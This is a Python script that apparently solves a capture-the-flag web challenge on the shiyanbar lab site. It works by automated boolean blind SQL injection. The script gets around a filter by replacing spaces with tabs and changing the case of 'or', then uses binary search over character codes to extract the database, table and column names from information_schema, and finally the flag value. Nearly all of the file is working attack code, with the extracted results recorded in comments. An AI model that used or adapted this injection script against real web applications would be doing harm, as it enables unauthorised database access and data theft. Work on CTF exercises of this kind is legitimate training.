# -*- coding: utf-8 -*-  
import requests
import urllib
url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
temp = 0
headers = {
    "Host": "ctf5.shiyanbar.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://ctf5.shiyanbar.com/web/earnest/index.php",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "81",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}
def make_payload(target):
    return target.replace(' ','%09').replace('or','Or')

def get_length(target):     #获取字段长度
    global headers
    global url  
    for i in range(0,50):
        print i 
        payload = target[:-5]+str(i)+target[-5:]
        payload = urllib.unquote(make_payload(payload))
        #print payload
        data = {"id":payload,"submit":"%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"}
        content = requests.post(url=url,headers=headers,data=data).text
        #print content
        if "You are in" in content:
            return i
    return 0

def search2(l,r,target):    #二分盲注喽，求单字节
    if l>r:
        return 
    global headers
    global url 
    global temp
    mid = (l+r)/2
    payload = target[:-5]+str(mid)+target[-5:]
    payload = urllib.unquote(make_payload(payload))
    print payload
    data = {"id":payload,"submit":"%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"}
    content = requests.post(url=url,headers=headers,data=data).text
    if "You are in" in content:
        temp = max(temp,mid)
        search2(mid+1,r,target)
    else:
        search2(l,mid-1,target)

def get_content(column,table,offset,len,where,sign):    #这么多参数是为了构造payload
    global temp
    content = ''
    for i in range(1,len+1):
        temp = 0
        if sign==0:
            payload = "0'Or(select ascii((select mid("+str(column)+" from "+str(i)+") from "+str(table)+" limit 1 offset "+str(offset)+"))>=)Or'0"
        else:
            payload = "0'Or(select ascii((select mid("+str(column)+" from "+str(i)+") from "+str(table)+" "+str(where)+" limit 1 offset "+str(offset)+"))>=)Or'0"
        search2(0,255,payload)
        content+=chr(temp)
        print content
    return content


#--------获取数据库名--------
#payload = "0'Or(length((select schema_name from information_schema.schemata limit 1 offset 1))=)Or'0"
#len = get_length(payload) #18
#database = get_content('schema_name','information_schema.schemata',"1",18,0,0) #ctf_sql_bool_blind#test

#--------获取表名--------
#payload = "0'Or(length((select table_name from information_schema.tables where table_schema=0x6374665f73716c5f626f6f6c5f626c696e64 limit 1 offset 0))=)Or'0"
#len = get_length(payload) #4,5
#table = get_content('table_name','information_schema.tables',"0",4,'where table_schema=0x6374665f73716c5f626f6f6c5f626c696e64',1) #fiag

#--------获取列名--------
#payload = "0'Or(length((select column_name from information_schema.columns where table_name=0x66696167 limit 1 offset 0))=)Or'0"
#len = get_length(payload) #5
#column = get_content('column_name','information_schema.columns',"0",5,'where table_name=0x66696167',1) #fL$4G

#--------获取字段内容--------
#payload = "0'Or(length((select fL$4G from fiag  limit 1 offset 0))=)Or'0"
#len = get_length(payload) #19
flag = get_content('fL$4G','fiag',"0",19,'0',0) #flag{haha~you win!}